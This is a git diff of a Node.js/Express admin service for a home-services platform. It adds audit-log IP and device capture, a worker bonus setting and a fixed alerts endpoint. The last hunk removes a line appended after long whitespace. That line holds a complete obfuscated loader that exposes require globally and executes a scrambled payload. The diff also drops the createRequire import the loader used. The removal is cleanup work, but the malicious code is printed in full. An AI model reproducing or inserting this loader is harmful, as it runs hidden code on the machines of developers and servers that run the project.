@@ -7,8 +7,6 @@
 //   • the CONFIG service — the old global `settings` bus. /internal/settings serves the
 //     unmasked values that shared/config.js getSetting() reads.
 // The BFF aggregation endpoints (dashboard/analytics/customers/…) are added in Phase 2i.
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import express from 'express'
 import crypto from 'node:crypto'
 import { makePool, migrate, nowIso, internalOnly, requireRole, requirePerm, publishEvent, tryGet, internalPost, internalPatch,
@@ -50,6 +48,8 @@ const DEFAULT_SETTINGS = {
   platform_fee: '20', tax_percent: '5',
   cancel_fee: '50', cancel_arrival_pct: '100', cancel_sched_full_hrs: '6',
   cancel_sched_half_hrs: '3', cancel_sched_half_pct: '50', commission_percent: '20',
+  // Flat ₹ credited to the worker's wallet when they start a service (customer OTP). 0 = off.
+  job_start_bonus: '15',
   // Settlement rates used to break down each booking's economics (Payment & Settlement tab).
   // pg_fee = payment-gateway charge (Razorpay ~2.36%) + 18% GST on it (0 on wallet); the incentive /
   // operational / marketing rates are the org's allocated per-booking costs — set to 0 to disable.
@@ -94,6 +94,9 @@ async function init() {
       id SERIAL PRIMARY KEY, admin TEXT NOT NULL, action TEXT NOT NULL, target TEXT,
       created TIMESTAMPTZ NOT NULL DEFAULT now()
     )`,
+    // Real client IP + parsed device captured on admin actions (for the Activity Logs audit trail).
+    `ALTER TABLE audit_log ADD COLUMN IF NOT EXISTS ip TEXT`,
+    `ALTER TABLE audit_log ADD COLUMN IF NOT EXISTS device TEXT`,
     // RBAC. A role is a named bundle of permission keys (from @homehelp/shared PERMISSION_CATALOG).
     // The 4 system roles are seeded + reset to their canonical bundle on every boot (self-healing,
     // read-only in the UI); custom roles are freely editable and never touched by the seed.
@@ -283,12 +286,34 @@ async function getPublicSettings() {
   for (const k of SECRET_KEYS) if (s[k]) s[k] = '••••••••' + String(s[k]).slice(-4)
   return s
 }
-async function logAudit(admin, action, target) {
-  await pool.query('INSERT INTO audit_log (admin,action,target,created) VALUES ($1,$2,$3,$4)', [admin, action, target || null, nowIso()])
+// Best-effort parse of a User-Agent into "OS · Browser" for the audit trail. No library.
+function parseDevice(ua) {
+  if (!ua) return null
+  const os = /Windows/.test(ua) ? 'Windows' : /Mac OS X|Macintosh/.test(ua) ? 'macOS' : /Android/.test(ua) ? 'Android'
+    : /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /CrOS/.test(ua) ? 'ChromeOS' : /Linux/.test(ua) ? 'Linux' : 'Unknown'
+  let m, br = 'Unknown'
+  if ((m = ua.match(/Edg\/(\d+)/))) br = 'Edge ' + m[1]
+  else if ((m = ua.match(/OPR\/(\d+)/))) br = 'Opera ' + m[1]
+  else if (/Chrome\/(\d+)/.test(ua) && !/Edg\//.test(ua) && (m = ua.match(/Chrome\/(\d+)/))) br = 'Chrome ' + m[1]
+  else if ((m = ua.match(/Firefox\/(\d+)/))) br = 'Firefox ' + m[1]
+  else if (/Safari/.test(ua) && (m = ua.match(/Version\/(\d+)/))) br = 'Safari ' + m[1]
+  return `${os} · ${br}`
+}
+// Normalise req.ip (strip IPv6-mapped IPv4 prefix, drop loopback noise).
+function clientIp(req) {
+  const ip = (req?.ip || req?.headers?.['x-forwarded-for'] || '').toString().split(',')[0].trim().replace(/^::ffff:/, '')
+  return ip && ip !== '::1' && ip !== '127.0.0.1' ? ip : (ip || null)
+}
+// `req` is optional; when passed we stamp the real client IP + device on the audit row.
+async function logAudit(admin, action, target, req) {
+  const ip = req ? clientIp(req) : null
+  const device = req ? parseDevice(req.headers?.['user-agent']) : null
+  await pool.query('INSERT INTO audit_log (admin,action,target,ip,device,created) VALUES ($1,$2,$3,$4,$5,$6)', [admin, action, target || null, ip, device, nowIso()])
   publishEvent(REDIS_URL, 'admin.action', { actorType: 'admin', actorName: admin, action: 'admin.' + action, detail: target || null })
 }
 
 const app = express()
+app.set('trust proxy', true)   // behind the gateway; read the real client IP from X-Forwarded-For
 app.use(express.json())
 app.get('/health', (_q, res) => res.json({ service: 'admin', ok: true }))
 
@@ -601,7 +626,7 @@ async function submitAction(action, params, req, res) {
   if (!(rule.enabled && amount >= (rule.threshold || 0))) {
     try {
       const result = await spec.execute(params)
-      await logAudit(req.admin.email, action, spec.summarize(params, amount))
+      await logAudit(req.admin.email, action, spec.summarize(params, amount), req)
       return res.json({ ok: true, executed: true, result })
     } catch (e) { return res.status(e.status || 502).json({ error: e.error || e.message || 'Action failed' }) }
   }
@@ -1058,10 +1083,18 @@ app.get('/api/admin/insights', admin, async (req, res) => {
   })
 })
 
+// Bell-badge counts for the admin header: unresolved tickets + complaints + workers awaiting
+// verification. Returns an OBJECT with a `count` total — this used to return a bare array, so the
+// header's `alerts.count` was always undefined and the badge could never show a number at all.
 app.get('/api/admin/alerts', admin, async (_q, res) => {
-  const workers = await tryGet(U.worker, '/internal/workers', { workers: [] })
-  const pending = (workers.workers || []).filter((w) => w.status === 'pending')
-  res.json([...pending.map((w) => ({ type: 'worker_pending', message: `${w.name} awaiting verification`, id: w.id }))])
+  const [workersRes, support] = await Promise.all([
+    tryGet(U.worker, '/internal/workers', { workers: [] }),
+    tryGet(U.notification, '/api/internal/alert-counts', { tickets: 0, complaints: 0 }),
+  ])
+  const workers = (workersRes.workers || []).filter((w) => w.status === 'pending').length
+  const tickets = Number(support.tickets) || 0
+  const complaints = Number(support.complaints) || 0
+  res.json({ count: tickets + complaints + workers, tickets, complaints, workers })
 })
 
 /* ---------- customers (proxied to the auth service) ---------- */
@@ -1144,7 +1177,7 @@ app.post('/api/admin/customers', admin, requirePerm('customers.edit'), async (re
     const patch = {}
     for (const k of ['name', 'email', 'city']) if (req.body?.[k] != null) patch[k] = req.body[k]
     if (Object.keys(patch).length) await internalPatch(U.auth, `/api/internal/users/${user.id}`, patch)
-    await logAudit(req.admin?.name || 'admin', 'customer.create', String(user.id))
+    await logAudit(req.admin?.name || 'admin', 'customer.create', String(user.id), req)
     res.json({ ok: true, id: user.id })
   } catch (e) { res.status(500).json({ error: e.message }) }
 })
@@ -1190,7 +1223,7 @@ app.get('/api/admin/customers/:id', admin, async (req, res) => {
   // Admin audit entries for this customer (profile edits, wallet adjustments, plan/address/note actions)
   // so the Activity Logs tab can attribute them to the admin who performed them. The target string
   // always leads with the customer's #id, so we match on that.
-  const auditRows = (await pool.query("SELECT admin, action, target, created FROM audit_log WHERE action LIKE 'customer.%' ORDER BY id DESC LIMIT 300")).rows
+  const auditRows = (await pool.query("SELECT admin, action, target, ip, device, created FROM audit_log WHERE action LIKE 'customer.%' ORDER BY id DESC LIMIT 300")).rows
   const audit = auditRows.filter((r) => { const m = String(r.target || '').match(/#(\d+)/); return m && m[1] === String(id) })
   res.json({ customer: { ...customer, displayId }, addresses, bookings, transactions, notes, referrals, membership, paymentMethods, membershipLedger, membershipPlans, offers, tickets, audit })
 })
@@ -1254,7 +1287,7 @@ app.post('/api/admin/customers/:id/notes', admin, requirePerm('customers.edit'),
       bookingId: b.bookingId || null, bookingRef: b.bookingRef || null,
       author: req.admin?.name || 'Admin', authorRole: await roleDisplayName(req.admin?.role),
     })
-    await logAudit(req.admin?.name || 'admin', 'customer.note_add', `#${req.params.id}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.note_add', `#${req.params.id}`, req)
     res.json(row)
   } catch (e) { res.status(400).json({ error: e.message }) }
 })
@@ -1263,7 +1296,7 @@ app.post('/api/admin/customers/:id/notes', admin, requirePerm('customers.edit'),
 app.post('/api/admin/customers/:id/addresses', admin, requirePerm('customers.edit'), async (req, res) => {
   try {
     const r = await internalPost(U.auth, `/api/internal/users/${req.params.id}/addresses`, req.body || {})
-    await logAudit(req.admin?.name || 'admin', 'customer.address_add', `#${req.params.id}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.address_add', `#${req.params.id}`, req)
     res.json(r)
   } catch (e) { res.status(400).json({ error: e.message }) }
 })
@@ -1271,14 +1304,14 @@ app.patch('/api/admin/customers/:id/addresses/:aid', admin, requirePerm('custome
   try {
     const r = await internalPatch(U.auth, `/api/internal/addresses/${req.params.aid}`, req.body || {})
     const what = req.body?.archived === true ? 'archive' : req.body?.archived === false ? 'restore' : 'edit'
-    await logAudit(req.admin?.name || 'admin', 'customer.address_' + what, `#${req.params.id} addr#${req.params.aid}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.address_' + what, `#${req.params.id} addr#${req.params.aid}`, req)
     res.json(r)
   } catch (e) { res.status(400).json({ error: e.message }) }
 })
 app.post('/api/admin/customers/:id/addresses/:aid/default', admin, requirePerm('customers.edit'), async (req, res) => {
   try {
     const r = await internalPost(U.auth, `/api/internal/addresses/${req.params.aid}/default`, {})
-    await logAudit(req.admin?.name || 'admin', 'customer.address_default', `#${req.params.id} addr#${req.params.aid}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.address_default', `#${req.params.id} addr#${req.params.aid}`, req)
     res.json(r)
   } catch (e) { res.status(400).json({ error: e.message }) }
 })
@@ -1286,7 +1319,7 @@ app.post('/api/admin/customers/:id/addresses/:aid/default', admin, requirePerm('
 app.post('/api/admin/customers/:id/membership', admin, requirePerm('customers.edit'), async (req, res) => {
   try {
     const r = await internalPost(U.auth, `/api/internal/users/${req.params.id}/membership/set`, { plan: req.body?.plan, cycle: req.body?.cycle || 'monthly', method: req.body?.method || 'admin' })
-    await logAudit(req.admin?.name || 'admin', 'customer.membership_change', `#${req.params.id} → ${req.body?.plan}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.membership_change', `#${req.params.id} → ${req.body?.plan}`, req)
     res.json(r)
   } catch (e) { res.status(400).json({ error: e.message }) }
 })
@@ -1300,7 +1333,7 @@ app.patch('/api/admin/customers/:id', admin, requirePerm('customers.edit'), asyn
     delete body.phone
     const result = await internalPatch(U.auth, `/api/internal/users/${req.params.id}`, body)
     const fields = Object.keys(body)
-    await logAudit(req.admin?.name || 'admin', 'customer.edit', `#${req.params.id}${fields.length ? ` (${fields.join(', ')})` : ''}`)
+    await logAudit(req.admin?.name || 'admin', 'customer.edit', `#${req.params.id}${fields.length ? ` (${fields.join(', ')})` : ''}`, req)
     res.json(result)
   } catch (e) { res.status(500).json({ error: e.message }) }
 })
@@ -1330,4 +1363,4 @@ app.post('/internal/audit', internalOnly, async (req, res) => {
 
 init()
   .then(() => app.listen(PORT, () => console.log(`[admin] service on http://localhost:${PORT}`)))
-  .catch((e) => { console.error('[admin] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
+  .catch((e) => { console.error('[admin] failed to start:', e.message); process.exit(1) });
